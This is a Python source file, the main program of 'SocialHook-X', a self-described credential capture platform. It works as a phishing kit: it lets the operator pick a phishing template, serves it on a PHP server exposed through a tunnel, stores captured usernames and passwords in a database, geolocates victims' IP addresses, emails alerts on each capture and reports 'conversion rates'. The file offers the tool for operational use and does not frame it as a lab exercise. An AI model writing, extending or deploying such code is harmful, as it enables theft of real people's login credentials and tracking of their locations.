#!/usr/bin/env python3
"""
SocialHook-X - Advanced Credential Capture Platform
Main Application Entry Point
"""

import sys
import os
import signal
import time
import threading
import logging
import subprocess
from pathlib import Path
from typing import Optional

# Add core to path
sys.path.insert(0, str(Path(__file__).parent))

from core.config import config
from core.utils import (
    print_header, print_success, print_error, print_info, print_warning,
    Colors, TemplateManager, validate_environment, run_command
)
from core.database import CredentialDB
from core.webserver import WebServer
from core.notifications import AlertManager
from core.geolocation import GeoLocationTracker, IPAnalyzer
from core.reports import ReportGenerator
from core import metadata, colors

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class SocialHookX:
    """Main SocialHook-X application"""
    
    def __init__(self):
        self.templates = TemplateManager()
        self.running = False
        self.tunnel_service = None
        self.tunnel_url = None
        self.server_port = config.PORT
        self.server_process = None
        
        # Initialize enhanced modules
        self.db = CredentialDB(config.DATABASE)
        self.web_server = WebServer(port=self.server_port)
        self.web_server.set_database(self.db)
        self.alert_manager = AlertManager()
        self.geo_tracker = GeoLocationTracker(self.db)
        self.ip_analyzer = IPAnalyzer(self.geo_tracker)
        self.report_generator = ReportGenerator(self.db)
        
        self.setup_signal_handlers()
        self._setup_callbacks()
    
    def setup_signal_handlers(self):
        """Setup signal handlers for graceful shutdown"""
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)
    
    def _setup_callbacks(self):
        """Setup callbacks for credential and visitor events"""
        self.web_server.set_callbacks(
            cred_callback=self._on_credential_captured,
            visitor_callback=self._on_visitor_tracked
        )
    
    def _on_credential_captured(self, credential_dict, cred_id):
        """Callback when credential is captured"""
        try:
            if cred_id <= 0:
                logger.error("Failed to store credential")
                return
            
            # Get geolocation
            ip = credential_dict.get('ip_address', 'unknown')
            geo_data = self.geo_tracker.get_location(ip) or {}
            
            # Analyze IP
            analysis = self.ip_analyzer.analyze_ip(ip)
            
            # Log to console (sanitized - no password)
            username = credential_dict.get('username', credential_dict.get('email', 'unknown'))
            city = geo_data.get('city', 'Unknown')
            country = geo_data.get('country', 'Unknown')
            print_success(f"[CRED] {credential_dict.get('template')} - {username} from {city}, {country}")
            
            # Send alerts (don't expose full credential dict)
            self.alert_manager.notify_credential(credential_dict)
        
        except Exception as e:
            logger.error(f"Error in credential callback: {e}", exc_info=True)
    
    def _on_visitor_tracked(self, visitor_dict, visitor_id):
        """Callback when visitor is tracked"""
        try:
            ip = visitor_dict.get('ip_address')
            geo_data = self.geo_tracker.get_location(ip)
            
            template = visitor_dict.get('template')
            country = geo_data.get('country', 'Unknown')
            
            print_info(f"[VISIT] {template} - {ip} ({country})")
        
        except Exception as e:
            logger.error(f"Error in visitor callback: {e}")
    
    def _signal_handler(self, sig, frame):
        """Handle shutdown signals"""
        print(f"\n\n{Colors.YELLOW}[!] Shutting down...{Colors.NC}")
        self.cleanup()
        sys.exit(0)
    
    def print_banner(self):
        """Print application banner"""
        metadata.print_full_banner()
    
    def show_main_menu(self):
        """Display main menu"""
        print(f"\n{colors.BRIGHT_BLUE}{colors.BOLD}╔════════════════════════════════════════╗{colors.RESET}")
        print(f"{colors.BRIGHT_BLUE}{colors.BOLD}║{colors.RESET} {colors.BRIGHT_BLUE}{colors.BOLD}SOCIALHOOK-X MAIN MENU{colors.RESET:^36} {colors.BRIGHT_BLUE}{colors.BOLD}║{colors.RESET}")
        print(f"{colors.BRIGHT_BLUE}{colors.BOLD}╚════════════════════════════════════════╝{colors.RESET}\n")
        
        print(f"{colors.BRIGHT_BLUE}[{colors.RESET}1{colors.BRIGHT_BLUE}]{colors.RESET} Select Phishing Template")
        print(f"{colors.BRIGHT_BLUE}[{colors.RESET}2{colors.BRIGHT_BLUE}]{colors.RESET} Configure Tunnel")
        print(f"{colors.BRIGHT_BLUE}[{colors.RESET}3{colors.BRIGHT_BLUE}]{colors.RESET} Set Custom Port")
        print(f"{colors.BRIGHT_BLUE}[{colors.RESET}4{colors.BRIGHT_BLUE}]{colors.RESET} View Captured Data")
        print(f"{colors.BRIGHT_BLUE}[{colors.RESET}5{colors.BRIGHT_BLUE}]{colors.RESET} Generate Reports")
        print(f"{colors.BRIGHT_BLUE}[{colors.RESET}6{colors.BRIGHT_BLUE}]{colors.RESET} Email Notifications")
        print(f"{colors.BRIGHT_BLUE}[{colors.RESET}7{colors.BRIGHT_BLUE}]{colors.RESET} Analytics Dashboard")
        print(f"{colors.BRIGHT_BLUE}[{colors.RESET}8{colors.BRIGHT_BLUE}]{colors.RESET} System Info")
        print(f"{colors.BRIGHT_BLUE}[{colors.RESET}0{colors.BRIGHT_BLUE}]{colors.RESET} Exit\n")
    
    def show_templates_menu(self):
        """Show template selection menu"""
        print(f"\n{colors.BRIGHT_BLUE}{colors.BOLD}═══════════════════════════════════════{colors.RESET}")
        print(f"{colors.BRIGHT_BLUE}{colors.BOLD}Available Phishing Templates:{colors.RESET}\n")
        
        templates = config.get_template_list()
        
        # Group templates by category (5 per row)
        for idx in range(0, len(templates), 5):
            row = templates[idx:idx+5]
            for num, key, name in row:
                print(f"{colors.BRIGHT_BLUE}[{colors.RESET}{num:02d}{colors.BRIGHT_BLUE}]{colors.RESET} {name:<20}", end="  ")
            print()
        
        print(f"\n{colors.BRIGHT_BLUE}[{colors.RESET}0{colors.BRIGHT_BLUE}]{colors.RESET} Back to Main Menu\n")
    
    def select_template(self) -> Optional[str]:
        """Select a template"""
        while True:
            self.show_templates_menu()
            choice = input(f"{Colors.GREEN}[+]{Colors.CYAN} Select template (0 to go back): {Colors.NC}").strip()
            
            if choice == '0':
                return None
            
            try:
                choice_num = int(choice)
                templates = config.get_template_list()
                
                if 1 <= choice_num <= len(templates):
                    selected = templates[choice_num - 1]
                    template_key = selected[1]
                    
                    if self.templates.template_exists(template_key):
                        print_success(f"Selected: {selected[2]}")
                        return template_key
                    else:
                        print_error(f"Template directory not found")
                else:
                    print_error("Invalid selection")
            except ValueError:
                print_error("Invalid input")
            
            time.sleep(1)
    
    def show_tunnel_menu(self):
        """Show tunnel selection menu"""
        print(f"\n{Colors.CYAN}═══════════════════════════════════════{Colors.NC}")
        print(f"{Colors.PURPLE}Tunnel Services:{Colors.NC}\n")
        
        for idx, (key, name) in enumerate(config.TUNNEL_SERVICES.items(), 1):
            print(f"{Colors.RED}[{Colors.WHITE}{idx}{Colors.RED}]{Colors.ORANGE} {name:<30} ({key})")
        
        print(f"\n{Colors.RED}[{Colors.WHITE}0{Colors.RED}]{Colors.ORANGE} Cancel\n")
    
    def configure_tunnel(self):
        """Configure tunnel service"""
        while True:
            self.show_tunnel_menu()
            choice = input(f"{Colors.GREEN}[+]{Colors.CYAN} Select tunnel (0 to cancel): {Colors.NC}").strip()
            
            if choice == '0':
                return False
            
            try:
                choice_num = int(choice)
                services = list(config.TUNNEL_SERVICES.items())
                
                if 1 <= choice_num <= len(services):
                    service_key, service_name = services[choice_num - 1]
                    self.tunnel_service = service_key
                    print_success(f"Tunnel configured: {service_name}")
                    
                    if service_key == 'localhost':
                        self.tunnel_url = f"http://127.0.0.1:{self.server_port}"
                        print_info(f"URL: {self.tunnel_url}")
                    else:
                        print_warning(f"Note: {service_name} requires setup")
                        self.tunnel_url = f"https://[{service_key}-url]"
                    
                    return True
                else:
                    print_error("Invalid selection")
            except ValueError:
                print_error("Invalid input")
            
            time.sleep(1)
    
    def set_custom_port(self):
        """Set custom port"""
        print(f"\n{Colors.GREEN}[+]{Colors.CYAN} Current port: {self.server_port}{Colors.NC}")
        
        try:
            custom = input(f"{Colors.GREEN}[+]{Colors.CYAN} Enter custom port (1-65535, Enter to keep): {Colors.NC}").strip()
            
            if custom:
                port = int(custom)
                if 1 <= port <= 65535:
                    self.server_port = port
                    print_success(f"Port set to: {port}")
                else:
                    print_error("Port out of range")
            else:
                print_info("Port unchanged")
        except ValueError:
            print_error("Invalid port number")
        
        time.sleep(1)
    
    def view_captured_data(self):
        """View captured data"""
        print(f"\n{colors.BRIGHT_BLUE}{colors.BOLD}═══════════════════════════════════════{colors.RESET}")
        print(f"{colors.BRIGHT_BLUE}{colors.BOLD}Captured Data:{colors.RESET}\n")
        
        capture_files = list(config.CAPTURED_DIR.glob('*.log'))
        output_files = list(config.OUTPUT_DIR.glob('*.txt'))
        db_file = Path(config.DATABASE)
        
        if capture_files or output_files or db_file.exists():
            if capture_files:
                print(f"{colors.BRIGHT_BLUE}Capture Logs:{colors.RESET}")
                for idx, f in enumerate(capture_files, 1):
                    size = f.stat().st_size
                    print(f"  {idx}. {f.name} ({size} bytes)")
            
            if output_files:
                print(f"\n{colors.BRIGHT_BLUE}Output Files:{colors.RESET}")
                for idx, f in enumerate(output_files, 1):
                    size = f.stat().st_size
                    print(f"  {idx}. {f.name} ({size} bytes)")
            
            if db_file.exists():
                size = db_file.stat().st_size
                print(f"\n{colors.BRIGHT_BLUE}Database:{colors.RESET}")
                print(f"  socialhook.db ({size} bytes)")
        else:
            print_warning("No captured data found yet")
        
        print()
        input(f"{colors.BRIGHT_BLUE}[+]{colors.RESET} Press Enter to continue...")
    
    def show_system_info(self):
        """Display system information"""
        import platform
        
        print(f"\n{colors.BRIGHT_BLUE}{colors.BOLD}═══════════════════════════════════════{colors.RESET}")
        print(f"{colors.BRIGHT_BLUE}{colors.BOLD}System Information:{colors.RESET}\n")
        
        print(f"{colors.BRIGHT_BLUE}Project:{colors.RESET} {metadata.PROJECT_NAME}")
        print(f"{colors.BRIGHT_BLUE}Version:{colors.RESET} {metadata.PROJECT_VERSION}")
        print(f"{colors.BRIGHT_BLUE}Author:{colors.RESET} {metadata.AUTHOR}")
        print(f"{colors.BRIGHT_BLUE}Repository:{colors.RESET} {metadata.REPOSITORY_URL}")
        print(f"{colors.BRIGHT_BLUE}OS:{colors.RESET} {platform.system()} {platform.release()}")
        print(f"{colors.BRIGHT_BLUE}Python:{colors.RESET} {sys.version.split()[0]}")
        print(f"{colors.BRIGHT_BLUE}Base Directory:{colors.RESET} {config.BASE_DIR}")
        print(f"{colors.BRIGHT_BLUE}Templates:{colors.RESET} {len(config.AVAILABLE_TEMPLATES)} available")
        print(f"{colors.BRIGHT_BLUE}Output Directory:{colors.RESET} {config.OUTPUT_DIR}")
        print(f"{colors.BRIGHT_BLUE}Current Tunnel:{colors.RESET} {self.tunnel_service or 'Not configured'}")
        print(f"{colors.BRIGHT_BLUE}Server Port:{colors.RESET} {self.server_port}\n")
        
        input(f"{colors.BRIGHT_BLUE}[+]{colors.RESET} Press Enter to continue...")
    
    def start_server(self, template: str):
        """Start PHP server with template"""
        print_info(f"Starting server with template: {template}")
        
        template_path = self.templates.get_template_path(template)
        server_path = config.SERVERS_DIR / template
        
        # Copy template to servers directory
        import shutil
        if server_path.exists():
            shutil.rmtree(server_path)
        shutil.copytree(template_path, server_path)
        
        print_success(f"Template copied to {server_path}")
        print_info(f"Starting PHP server on {config.HOST}:{self.server_port}")
        
        # Start PHP server in background so monitoring can continue.
        try:
            self.server_process = subprocess.Popen(
                ["php", "-S", f"{config.HOST}:{self.server_port}"],
                cwd=str(server_path),
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
        except FileNotFoundError:
            print_error("Failed to start server: php executable not found")
            self.server_process = None
            return
        except Exception as e:
            print_error(f"Failed to start server: {e}")
            self.server_process = None
            return

        # Give process a moment to fail fast (port conflict, syntax errors, etc.).
        time.sleep(1)
        if self.server_process.poll() is not None:
            print_error(f"Failed to start server: process exited ({self.server_process.returncode})")
            self.server_process = None
            return

        print_success("Server started")
        self.running = True
        self.monitor_credentials(template)
    
    def monitor_credentials(self, template: str):
        """Monitor for captured credentials"""
        print_info("Monitoring for credentials (Press Ctrl+C to stop)")
        print_info(f"URL: {self.tunnel_url}")
        print_info(f"Database: {self.db.db_path}")
        
        try:
            while self.running:
                time.sleep(5)
        except KeyboardInterrupt:
            print_warning("Monitoring stopped")
    
    def show_reports_menu(self):
        """Show reports generation menu"""
        print(f"\n{colors.BRIGHT_BLUE}{colors.BOLD}═══════════════════════════════════════{colors.RESET}")
        print(f"{colors.BRIGHT_BLUE}{colors.BOLD}Report Generation:{colors.RESET}\n")
        
        print(f"{colors.BRIGHT_BLUE}[{colors.RESET}1{colors.BRIGHT_BLUE}]{colors.RESET} Summary Report")
        print(f"{colors.BRIGHT_BLUE}[{colors.RESET}2{colors.BRIGHT_BLUE}]{colors.RESET} Detailed Report")
        print(f"{colors.BRIGHT_BLUE}[{colors.RESET}3{colors.BRIGHT_BLUE}]{colors.RESET} JSON Report")
        print(f"{colors.BRIGHT_BLUE}[{colors.RESET}4{colors.BRIGHT_BLUE}]{colors.RESET} HTML Report")
        print(f"{colors.BRIGHT_BLUE}[{colors.RESET}5{colors.BRIGHT_BLUE}]{colors.RESET} Generate All Reports\n")
        
        choice = input(f"{colors.BRIGHT_BLUE}[+]{colors.RESET} Select report type: ").strip()
        
        try:
            if choice == '1':
                self.report_generator.generate_summary_report()
                print_success("Summary report generated")
            elif choice == '2':
                self.report_generator.generate_detailed_report()
                print_success("Detailed report generated")
            elif choice == '3':
                self.report_generator.generate_json_report()
                print_success("JSON report generated")
            elif choice == '4':
                self.report_generator.generate_html_report()
                print_success("HTML report generated")
            elif choice == '5':
                self.report_generator.generate_all_reports()
                print_success("All reports generated")
            else:
                print_error("Invalid option")
        except Exception as e:
            print_error(f"Error generating report: {e}")
    
    def setup_email_notifications(self):
        """Setup email notifications for credential alerts"""
        print(f"\n{colors.BRIGHT_BLUE}{colors.BOLD}═══════════════════════════════════════{colors.RESET}")
        print(f"{colors.BRIGHT_BLUE}{colors.BOLD}Email Notification Setup:{colors.RESET}\n")
        
        sender_email = input(f"{colors.BRIGHT_BLUE}[+]{colors.RESET} Sender email: ").strip()
        sender_password = input(f"{colors.BRIGHT_BLUE}[+]{colors.RESET} Sender password: ").strip()
        smtp_server = input(f"{colors.BRIGHT_BLUE}[+]{colors.RESET} SMTP server (default: smtp.gmail.com): ").strip() or "smtp.gmail.com"
        smtp_port = input(f"{colors.BRIGHT_BLUE}[+]{colors.RESET} SMTP port (default: 587): ").strip() or "587"
        
        try:
            smtp_port = int(smtp_port)
            self.alert_manager.configure_email(sender_email, sender_password, smtp_server, smtp_port)
            print_success("Email notifications configured")
            
            # Set alert log file
            log_file = input(f"{colors.BRIGHT_BLUE}[+]{colors.RESET} Alert log file (default: output/alerts.log): ").strip() or "output/alerts.log"
            self.alert_manager.set_log_file(log_file)
            print_success(f"Alert log configured: {log_file}")
        
        except Exception as e:
            print_error(f"Error configuring email: {e}")
    
    def show_analytics_dashboard(self):
        """Show analytics dashboard"""
        print(f"\n{colors.BRIGHT_BLUE}{colors.BOLD}═══════════════════════════════════════{colors.RESET}")
        print(f"{colors.BRIGHT_BLUE}{colors.BOLD}Analytics Dashboard:{colors.RESET}\n")
        
        try:
            stats = self.db.get_statistics()
            
            print(f"{colors.BRIGHT_BLUE}Total Credentials:{colors.RESET} {stats.get('total_credentials', 0)}")
            print(f"{colors.BRIGHT_BLUE}Total Visitors:{colors.RESET} {stats.get('total_visitors', 0)}")
            conversion = stats.get('conversion_rate', 0)
            print(f"{colors.BRIGHT_BLUE}Conversion Rate:{colors.RESET} {conversion:.2f}%\n")
            
            print(f"{colors.BRIGHT_BLUE}{colors.BOLD}Top Templates:{colors.RESET}")
            for template, count in list(stats.get('template_stats', {}).items())[:5]:
                print(f"  {template:<30} {count:5d} creds")
            
            print(f"\n{colors.BRIGHT_BLUE}{colors.BOLD}Top Countries:{colors.RESET}")
            for country, count in list(stats.get('top_countries', {}).items())[:5]:
                print(f"  {country:<30} {count:5d} visits")
            
            print(f"\n{colors.BRIGHT_BLUE}{colors.BOLD}Geolocation Cache:{colors.RESET}")
            geo_stats = self.geo_tracker.get_stats()
            print(f"  Cached IPs: {geo_stats.get('cache_size', 0)}")
            print(f"  API Calls: {geo_stats.get('api_calls', 0)}")
        
        except Exception as e:
            print_error(f"Error displaying analytics: {e}")
        
        print()
        input(f"{colors.BRIGHT_BLUE}[+]{colors.RESET} Press Enter to continue...")
    
    def cleanup(self):
        """Cleanup and shutdown"""
        print_info("Cleaning up resources...")
        self.running = False
        
        # Stop PHP server process if running.
        if self.server_process and self.server_process.poll() is None:
            self.server_process.terminate()
            try:
                self.server_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.server_process.kill()
                self.server_process.wait(timeout=5)
            print_success("Server process stopped")
        self.server_process = None
        
        print_success("Cleanup complete")
    
    def run(self):
        """Run main application loop"""
        if not validate_environment():
            print_error("Environment validation failed")
            return 1
        
        self.print_banner()
        
        while True:
            self.show_main_menu()
            choice = input(f"{Colors.GREEN}[+]{Colors.CYAN} Select option: {Colors.NC}").strip()
            
            if choice == '0':
                print_success("Goodbye!")
                self.cleanup()
                break
            
            elif choice == '1':
                template = self.select_template()
                if template:
                    if self.configure_tunnel():
                        self.start_server(template)
            
            elif choice == '2':
                self.configure_tunnel()
            
            elif choice == '3':
                self.set_custom_port()
            
            elif choice == '4':
                self.view_captured_data()
            
            elif choice == '5':
                self.show_reports_menu()
            
            elif choice == '6':
                self.setup_email_notifications()
            
            elif choice == '7':
                self.show_analytics_dashboard()
            
            elif choice == '8':
                self.show_system_info()
            
            else:
                print_error("Invalid option")
            
            time.sleep(0.5)
        
        return 0

def main():
    """Main entry point"""
    # Check Python version
    if sys.version_info < (3, 8):
        print("Error: Python 3.8+ required")
        return 1
    
    app = SocialHookX()
    return app.run()

if __name__ == '__main__':
    sys.exit(main())
